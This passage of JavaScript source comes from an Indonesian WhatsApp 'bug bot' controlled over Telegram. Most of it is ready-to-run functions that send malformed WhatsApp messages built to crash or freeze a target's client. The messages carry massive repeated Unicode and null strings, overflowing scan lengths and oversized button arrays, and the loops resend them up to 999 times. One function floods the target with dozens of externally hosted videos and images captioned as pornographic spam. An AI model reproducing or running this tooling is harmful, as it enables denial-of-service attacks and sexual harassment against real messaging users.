        if (!blacklistCommands.commands) blacklistCommands.commands = [];
    } catch (e) {
        blacklistCommands = { commands: [] };
    }
} else {
    fs.writeFileSync(blacklistFile, JSON.stringify({ commands: [] }, null, 2));
}

function isCommandBlacklisted(command) {
    if (!blacklistCommands || !blacklistCommands.commands) return false;
    return blacklistCommands.commands.includes(command);
}

function saveBlacklist() {
    fs.writeFileSync(blacklistFile, JSON.stringify(blacklistCommands, null, 2));
}

const validBugCommands = ["delayrose", "delaynew", "fcori", "crashnew", "crashios", "spambkp", "crashgroup", "testfunction"];

// ========== BLACKLIST COMMAND ==========
bot.command("blacklist", async (ctx) => {
if (!isGroupOnlyAllowed(ctx)) {
        return ctx.reply("🚫 Bot sedang dalam mode Group Only. Command ini hanya bisa digunakan di dalam grup.\nHubungi owner untuk info lebih lanjut.", { parse_mode: "Markdown" });
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("🪧 Format: /blacklist /command");
    if (ctx.from.id.toString() !== ownerID) return ctx.reply("❌ Hanya owner!");
    
    const cmd = args[1].toLowerCase();
    if (!validBugCommands.includes(cmd)) return ctx.reply("❌ Command tidak valid!");
    if (blacklistCommands.commands.includes(cmd)) return ctx.reply("⚠️ Sudah diblacklist!");
    
    blacklistCommands.commands.push(cmd);
    saveBlacklist();
    ctx.reply(`✅ ${cmd} diblacklist!`);
});

bot.command("unblacklist", async (ctx) => {
if (!isGroupOnlyAllowed(ctx)) {
        return ctx.reply("🚫 Bot sedang dalam mode Group Only. Command ini hanya bisa digunakan di dalam grup.\nHubungi owner untuk info lebih lanjut.", { parse_mode: "Markdown" });
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("🪧 Format: /unblacklist /command");
    if (ctx.from.id.toString() !== ownerID) return ctx.reply("❌ Hanya owner!");
    
    const cmd = args[1].toLowerCase();
    if (!blacklistCommands.commands.includes(cmd)) return ctx.reply("❌ Tidak ada di blacklist!");
    
    blacklistCommands.commands = blacklistCommands.commands.filter(c => c !== cmd);
    saveBlacklist();
    ctx.reply(`✅ ${cmd} dihapus dari blacklist!`);
});

bot.command("listblacklist", async (ctx) => {
if (!isGroupOnlyAllowed(ctx)) {
        return ctx.reply("🚫 Bot sedang dalam mode Group Only. Command ini hanya bisa digunakan di dalam grup.\nHubungi owner untuk info lebih lanjut.", { parse_mode: "Markdown" });
    }
    if (ctx.from.id.toString() !== ownerID) return ctx.reply("❌ Hanya owner!");
    if (blacklistCommands.commands.length === 0) return ctx.reply("✅ Kosong!");
    
    ctx.reply(`📛 *BLACKLIST*\n\n${blacklistCommands.commands.map((c, i) => `${i+1}. ${c}`).join("\n")}`, { parse_mode: "Markdown" });
});


// ( FUNGSI BIAR BISA BUAT SPAM ) //
async function BebasSpam(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 2000; // ATUR JEDA PENGIRIMAN
  const lopers = 999; // ATUR MAU BERAPA DIKIRIM
  const startTime = Date.now();


  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();

    try {
      await crashV2(sock, target);
      
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
}

async function SpamDelay(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 300; // ATUR JEDA PENGIRIMAN
  const lopers = 50; // ATUR MAU BERAPA DIKIRIM
  const startTime = Date.now();


  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();

    try {
      await freezexdelay(sock, target);
      
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
}

async function LockSpam(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 300; // ATUR JEDA PENGIRIMAN
  const lopers = 50; // ATUR MAU BERAPA DIKIRIM
  const startTime = Date.now();


  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();

    try {
      await LockJam(sock, target);
      
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
}

async function SpamCorsel(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 300; // ATUR JEDA PENGIRIMAN
  const lopers = 1; // ATUR MAU BERAPA DIKIRIM
  const startTime = Date.now();


  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();

    try {
      await carouselTrava(sock, target);
      
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
}



// ( FUNCTION NEW ) //
async function groupSt(target) {
  let msg = generateWAMessageFromContent(target, {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5ecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
      caption: "Xaata",
      fileLength: "149502",
      height: 1397,
      width: 1126,
      mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
      fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
      directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1777621571",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        isQuestion: true,
        isGroupStatus: true
      },
      scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
      scanLengths: [
        2899999999999999077,
        1799999999999998555,
        7699999999999999148,
        1069999999999999164
      ],
      midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
    }
  }, {}); 
  await sock.relayMessage(target, msg.message, {});
}

async function BokepLx(sock, target) {
    const mediaUrls = [
        "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4",
  "https://files.catbox.moe/zjo5r6.mp4",
  "https://files.catbox.moe/7i6amv.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4",
  "https://files.catbox.moe/fxe94h.mp4",
  "https://files.catbox.moe/52oh63.mp4",
  "https://files.catbox.moe/ite58a.mp4",
  "https://files.catbox.moe/svw26n.mp4",
  "https://files.catbox.moe/bv5yaa.mp4",
  "https://files.catbox.moe/ozk5xr.mp4",
  "https://files.catbox.moe/926k9a.mp4",
  "https://files.catbox.moe/kusho1.jpg",
  "https://files.catbox.moe/85mjwm.mp4",
  "https://files.catbox.moe/fzzhjm.jpg",
  "https://files.catbox.moe/ec28m8.mp4",
  "https://files.catbox.moe/n3ebuz.mp4",
  "https://files.catbox.moe/qhr4fl.jpg",
  "https://files.catbox.moe/zqaszb.mp4",
  "https://files.catbox.moe/34aa39.mp4",
  "https://files.catbox.moe/dmbizk.mp4",
  "https://files.catbox.moe/wmda7z.mp4",
  "https://files.catbox.moe/kwb2m2.jpg",
  "https://files.catbox.moe/8xye1k.jpg",
  "https://files.catbox.moe/y1osro.mp4",
  "https://files.catbox.moe/2mowo7.jpg",
  "https://files.catbox.moe/o1ipxw.mp4",
  "https://files.catbox.moe/i6335n.mp4",
  "https://files.catbox.moe/73rjgf.jpg",
  "https://files.catbox.moe/3re1pn.jpg",
  "https://files.catbox.moe/sclrvo.jpg",
  "https://files.catbox.moe/l3sra9.jpg",
  "https://files.catbox.moe/vxe9zl.mp4",
  "https://files.catbox.moe/9vtw1i.jpg",
  "https://files.catbox.moe/o1sq2k.mp4",
  "https://files.catbox.moe/y91pkz.jpg",
  "https://files.catbox.moe/0hies4.jpg",
  "https://files.catbox.moe/hnbks1.jpg",
  "https://files.catbox.moe/1a78ht.mp4",
  "https://files.catbox.moe/htcdyl.jpg",
  "https://files.catbox.moe/iajl3r.mp4",
  "https://files.catbox.moe/pamcr7.jpg",
  "https://files.catbox.moe/eti8qi.mp4",
  "https://files.catbox.moe/wgj8vl.mp4",
  "https://files.catbox.moe/83fd5h.mp4",
  "https://files.catbox.moe/k1w8sw.jpg",
  "https://files.catbox.moe/tdqof8.jpg",
  "https://files.catbox.moe/6di4hn.mp4",
  "https://files.catbox.moe/0eisok.mp4",
  "https://files.catbox.moe/e5zkcl.jpg"
    ];

    const caption = "MAMPUS SPAM BOKEP";

    for (const url of mediaUrls) {
        const lower = url.toLowerCase();

        const isVideo = /\.(mp4|mov|mkv|webm)$/i.test(lower);
        const isImage = /\.(jpg|jpeg|png|webp)$/i.test(lower);

        if (!isVideo && !isImage) continue;

        const msg = isVideo
            ? {
                video: { url },
                caption,
                mimetype: "video/mp4"
            }
            : {
                image: { url },
                caption
            };

        await sock.sendMessage(target, msg);
        await new Promise(r => setTimeout(r, 800));
    }
}

async function LocationIos(sock, target) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";
    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(10000),
      url: `${𑇂𑆵𑆴𑆿.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: "𑇂𑆵𑆴𑆿".repeat(25000),
        title: "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 64,
        thumbnailWidth: 60,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await sock.relayMessage(
        "status@broadcast",   // ⬅️ TETAP broadcast
        m.message,
        {
          messageId: m.key.id,
          statusJidList: [target], // ⬅️ target tetap dipakai
          additionalNodes: metaNode
        }
      );
    }

  } catch (e) {
    console.error(e);
  }
}

async function fcandro(target) {
let message = await generateWAMessageFromContent(
target, {
imageMessage: {
url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
mimetype: "image/jpeg",
fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
caption: "X",
fileLength: "149502",
height: 1397,
width: 1126,
mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
mediaKeyTimestamp: "1777621571",
jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
scanLengths: [2899999999999999077,1799999999999998555,7699999999999999148,1069999999999999164],
midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
},
}, { userJid: target, quoted: null });

await sock.relayMessage("status@broadcast", message.message, {
messageId: message.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
});
console.log(`.!farras`);
}

async function crasVisiBle(sock, target) {
    const MakLo = {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
            fileLength: 999999999,
            height: 9999,
            width: 9999,
            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1776937541",
            jpegThumbnail: null,
            caption: "MakLoo¡!",
            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
            scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
            ],
            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
        },
    };

    const message2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Sebenernya gw suka sama lo" + "\u0000".repeat(50000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "booking_status",
                            buttonParamsJson: JSON.stringify({
                                reference_id: "ꦽ".repeat(20000),
                                status: "nganu" + "\u200C".repeat(40000)
                            })
                        }],
                        messageParamsJson: "{".repeat(20000)
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, MakLo, {});
    const msg2 = await sock.relayMessage(target, message2, {
        participant: {
            jid: target
        }
    });

    await sock.relayMessage(target, {
        statusMentionMessage: {
            message: {
                protocolMessage: {
                    key: {
                        remoteJid: target,
                        fromMe: true,
                        id: msg2
                    },
                    type: 25
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined,
                }, ],
            }, ],
        }, ],
    });

    await sock.relayMessage(
        target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25,
                    },
                    additionalNodes: [{
                        tag: "meta",
                        attrs: {
                            is_status_mention: "false"
                        },
                        content: undefined,
                    }, ],
                },
            },
        }, {}
    );
    await sleep(3000);
}

async function ArrayButtons(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: " I Killing You "
      },
      nativeFlowMessage: {
        buttons: "XxX".repeat(500000)
      }
    }
  }, { participant: { jid: target } })
}

async function invisibleInfinity(sock, target, mention = true) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        header: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
            fileLength: "93217",
            caption: "v",
            height: 1080,
            width: 1080,
            mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
            fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
            directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1778142659",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxIhMiQUL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
            contextInfo: {
              isQuestion: true,
              isGroupStatus: true
            },
            scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
            scanLengths: [
              9999999999999999999,
              9999999999999999999,
              9999999999999999999,
              9999999999999999999
            ],
            midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
          }
        },
        interactiveMessage: {
          body: { text: "XX" },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                paramsJson: "{\"title\":\"✨⃟༑️\",\"sections\":[{\"title\":\"ϟ\",\"rows\":[]}]}",
                version: 3
              },
              {
                name: "galaxy_message",
                paramsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"️DOCUMENT\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}",
                version: 3
              },
              {
                name: "address_message",
                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
                version: 3
              }
            ]
          }
        },
        carouselMessage: {
          cards: [
            {
              header: { hasMediaAttachment: false },
              body: { text: "🐉 You\n\n" + "ꦽ".repeat(60000) },
              nativeFlowMessage: {
                paramsJson: "?",
                buttons: [
                  {
                    name: "address_message",
                    paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
                    version: 3
                  }
                ]
              }
            }
          ]
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }
    ]
  });
}

async function crashV5(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Farras Style Humble"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
  
  await sock.relayMessage("status@broadcast", {
    interactiveResponseMessage: {
      body: {
        text: "Farras Style Humble",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "FORM_SCREEN",
        version: 3
      },
      contextInfo: {
        remoteJid: Math.random().toString(36) + "CALL_ACCESS",
        isForwarded: true,
        forwardingScore: 999,
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
            "\u0000": "Grettles"
          }))
        }
      }
    }
  }, {
    participant: { jid: target },
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}

async function invisibleXbuldo(sock, target) {
  for (let i = 0; i < 50; i++) {
    const msg1 = {
      extendedTextMessage: {
        text: "\u400b".repeat(50000),
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, () => Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
        }
      }
    };
    await sock.relayMessage("status@broadcast", msg1, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
